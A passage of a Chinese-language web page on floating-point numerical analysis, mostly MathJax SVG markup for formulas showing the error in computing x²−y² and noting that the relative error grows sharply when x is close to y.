280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(1841.5,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(2286.1,0)"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(2776.1,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(3442.9,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msup" transform="translate(4498.7,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,413) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(5507.2,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(5896.2,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(6618.5,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mi" transform="translate(7618.7,0)"><path data-c="1D716" d="M227 -11Q149 -11 95 41T40 174Q40 262 87 322Q121 367 173 396T287 430Q289 431 329 431H367Q382 426 382 411Q382 385 341 385H325H312Q191 385 154 277L150 265H327Q340 256 340 246Q340 228 320 219H138V217Q128 187 128 143Q128 77 160 52T231 26Q258 26 284 36T326 57T343 68Q350 68 354 58T358 39Q358 36 357 35Q354 31 337 21T289 0T227 -11Z"></path></g><g data-mml-node="mo" transform="translate(8024.7,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(8635.9,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="msup" transform="translate(9636.1,0)"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mn" transform="translate(523,413) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(10562.7,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(10951.7,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(11673.9,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mi" transform="translate(12674.1,0)"><path data-c="1D716" d="M227 -11Q149 -11 95 41T40 174Q40 262 87 322Q121 367 173 396T287 430Q289 431 329 431H367Q382 426 382 411Q382 385 341 385H325H312Q191 385 154 277L150 265H327Q340 256 340 246Q340 228 320 219H138V217Q128 187 128 143Q128 77 160 52T231 26Q258 26 284 36T326 57T343 68Q350 68 354 58T358 39Q358 36 357 35Q354 31 337 21T289 0T227 -11Z"></path></g><g data-mml-node="mo" transform="translate(13080.1,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(13691.3,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mo" transform="translate(14691.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msup" transform="translate(15080.6,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,413) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(16311.3,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="msup" transform="translate(17311.6,0)"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mn" transform="translate(523,413) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(18238.1,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(18904.9,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(19960.7,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msup" transform="translate(20349.7,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,413) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(21580.4,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="msup" transform="translate(22580.7,0)"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mn" transform="translate(523,413) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(23507.2,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(24118.4,0)"><path data-c="22C5" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z"></path></g><g data-mml-node="mi" transform="translate(24618.7,0)"><path data-c="1D716" d="M227 -11Q149 -11 95 41T40 174Q40 262 87 322Q121 367 173 396T287 430Q289 431 329 431H367Q382 426 382 411Q382 385 341 385H325H312Q191 385 154 277L150 265H327Q340 256 340 246Q340 228 320 219H138V217Q128 187 128 143Q128 77 160 52T231 26Q258 26 284 36T326 57T343 68Q350 68 354 58T358 39Q358 36 357 35Q354 31 337 21T289 0T227 -11Z"></path></g></g></g></svg></mjx-container></span> 相对误差： <span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -2.093ex;" xmlns="http://www.w3.org/2000/svg" width="12.452ex" height="5.586ex" role="img" focusable="false" viewBox="0 -1543.9 5504 2468.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mfrac"><g data-mml-node="mrow" transform="translate(220,710)"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msup" transform="translate(389,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,363) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(1619.8,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="msup" transform="translate(2620,0)"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mn" transform="translate(523,363) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(3546.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(4157.8,0)"><path data-c="22C5" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z"></path></g><g data-mml-node="mi" transform="translate(4658,0)"><path data-c="1D716" d="M227 -11Q149 -11 95 41T40 174Q40 262 87 322Q121 367 173 396T287 430Q289 431 329 431H367Q382 426 382 411Q382 385 341 385H325H312Q191 385 154 277L150 265H327Q340 256 340 246Q340 228 320 219H138V217Q128 187 128 143Q128 77 160 52T231 26Q258 26 284 36T326 57T343 68Q350 68 354 58T358 39Q358 36 357 35Q354 31 337 21T289 0T227 -11Z"></path></g></g><g data-mml-node="mrow" transform="translate(1173.2,-719.9)"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,289) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(1230.8,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="msup" transform="translate(2231,0)"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mn" transform="translate(523,289) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g></g><rect width="5264" height="60" x="120" y="220"></rect></g></g></g></svg></mjx-container></span> 当 <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.464ex;" xmlns="http://www.w3.org/2000/svg" width="5.42ex" height="1.557ex" role="img" focusable="false" viewBox="0 -483 2395.6 688"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(849.8,0)"><path data-c="2248" d="M55 319Q55 360 72 393T114 444T163 472T205 482Q207 482 213 482T223 483Q262 483 296 468T393 413L443 381Q502 346 553 346Q609 346 649 375T694 454Q694 465 698 474T708 483Q722 483 722 452Q722 386 675 338T555 289Q514 289 468 310T388 357T308 404T224 426Q164 426 125 393T83 318Q81 289 69 289Q55 289 55 319ZM55 85Q55 126 72 159T114 210T163 238T205 248Q207 248 213 248T223 249Q262 249 296 234T393 179L443 147Q502 112 553 112Q609 112 649 141T694 220Q694 249 708 249T722 217Q722 153 675 104T555 55Q514 55 468 76T388 123T308 170T224 192Q164 192 125 159T83 84Q80 55 69 55Q55 55 55 85Z"></path></g><g data-mml-node="mi" transform="translate(1905.6,0)"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g></g></g></svg></mjx-container></span>
时，分母趋近于 0，误差会急剧放大。</p>
